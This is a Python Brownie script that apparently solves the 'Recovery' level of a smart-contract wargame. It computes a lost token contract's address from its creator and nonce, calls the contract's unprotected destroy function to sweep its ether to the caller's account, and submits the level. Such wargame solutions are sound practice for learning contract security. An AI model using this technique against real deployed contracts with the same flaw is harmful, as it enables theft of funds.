from brownie import web3, Recovery, SimpleToken

import rlp
from eth_utils import keccak, to_checksum_address, to_bytes

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "17_recovery"
INTERFACE_CONTRACT = Recovery
INSTANCE_VALUE_WEI = web3.toWei(0, "ether")


def solve_level(level_contract):
    account = get_account()
    lost_address = mk_contract_address(level_contract.address, 1)
    print(f"Lost address: {lost_address}")
    simple_token = SimpleToken.at(lost_address)
    simple_token.destroy(account.address, {"from": account})
    SimpleToken.remove(simple_token)


# brownie run scripts/_17_recovery.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved


def mk_contract_address(sender: str, nonce: int) -> str:
    """Create a contract address using eth-utils.

    # https://ethereum.stackexchange.com/a/761/620
    """
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    h = keccak(raw)
    address_bytes = h[12:]
    return to_checksum_address(address_bytes)
